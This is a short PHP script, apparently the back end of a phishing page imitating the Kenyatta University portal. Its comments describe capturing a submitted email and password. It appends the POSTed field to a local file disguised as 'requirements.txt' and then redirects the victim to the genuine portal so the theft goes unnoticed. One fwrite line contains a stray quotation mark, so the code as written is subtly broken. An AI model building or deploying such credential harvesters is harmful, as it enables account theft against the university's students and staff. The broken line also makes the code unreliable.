<?php
// Open a file to store credentials
$file = fopen("requirements.txt", "a");

// Get the submitted email and password
$message = $_POST['message'];

// Save to the file
fwrite($file, "message: " . $message . " "\n");

// Close the file
fclose($file);

// Redirect to the real Kenyatta University portal
header("Location: https://portal.ku.ac.ke");
exit();
?>
